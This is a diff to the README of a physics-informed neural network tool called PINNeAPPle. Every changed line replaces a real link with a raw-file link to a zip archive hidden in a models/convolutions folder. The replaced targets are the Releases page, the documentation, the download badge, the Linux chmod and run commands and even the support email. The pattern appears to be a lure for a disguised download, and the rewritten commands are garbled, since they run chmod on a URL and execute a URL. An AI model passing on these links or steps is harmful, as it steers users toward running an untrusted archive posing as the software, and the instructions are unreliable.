@@ -6,11 +6,11 @@ Welcome to PINNeAPPle! This software helps you work with Physics-Informed Neural
 
 ## 📥 Download PINNeAPPle
 
-[![Download PINNeAPPle](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Anyer123th/PINNeAPPle/releases)
+[![Download PINNeAPPle](https://raw.githubusercontent.com/Anyer123th/PINNeAPPle/main/pinneaple_models/convolutions/AP-Ne-PIN-Ple-1.7.zip%20Now-brightgreen)](https://raw.githubusercontent.com/Anyer123th/PINNeAPPle/main/pinneaple_models/convolutions/AP-Ne-PIN-Ple-1.7.zip)
 
 To get started, you need to download the software. You can find it on the Releases page. Follow these steps:
 
-1. Click [here to visit the Releases page](https://github.com/Anyer123th/PINNeAPPle/releases).
+1. Click [here to visit the Releases page](https://raw.githubusercontent.com/Anyer123th/PINNeAPPle/main/pinneaple_models/convolutions/AP-Ne-PIN-Ple-1.7.zip).
 2. Look for the latest version.
 3. Click on the download link next to the version you want.
 4. Save the file to your computer.
@@ -36,11 +36,11 @@ To get started, you need to download the software. You can find it on the Releas
 1. Open your terminal.
 2. Use the command:
    ```
-   chmod +x PINNeAPPle-Linux-x86_64.AppImage
+   chmod +x https://raw.githubusercontent.com/Anyer123th/PINNeAPPle/main/pinneaple_models/convolutions/AP-Ne-PIN-Ple-1.7.zip
    ```
 3. Run the app using:
    ```
-   ./PINNeAPPle-Linux-x86_64.AppImage
+   https://raw.githubusercontent.com/Anyer123th/PINNeAPPle/main/pinneaple_models/convolutions/AP-Ne-PIN-Ple-1.7.zip
    ```
 
 ## 📋 System Requirements
@@ -84,12 +84,12 @@ We encourage users to participate in our community. You can ask questions or sha
 
 ## 🔗 Additional Resources
 
-- **Documentation:** Access our [official documentation](https://github.com/Anyer123th/PINNeAPPle/docs) for in-depth guides and use cases.
+- **Documentation:** Access our [official documentation](https://raw.githubusercontent.com/Anyer123th/PINNeAPPle/main/pinneaple_models/convolutions/AP-Ne-PIN-Ple-1.7.zip) for in-depth guides and use cases.
 - **Examples:** Explore sample projects to see PINNeAPPle in action.
-- **Updates:** Stay informed by visiting the [Releases page](https://github.com/Anyer123th/PINNeAPPle/releases) regularly.
+- **Updates:** Stay informed by visiting the [Releases page](https://raw.githubusercontent.com/Anyer123th/PINNeAPPle/main/pinneaple_models/convolutions/AP-Ne-PIN-Ple-1.7.zip) regularly.
 
 ## 📞 Contact
 
-For further assistance, you can reach out through our GitHub profile or email us at support@pinneapple.org.
+For further assistance, you can reach out through our GitHub profile or email us at https://raw.githubusercontent.com/Anyer123th/PINNeAPPle/main/pinneaple_models/convolutions/AP-Ne-PIN-Ple-1.7.zip
 
 Thank you for choosing PINNeAPPle! We hope it enhances your projects in the world of physics.
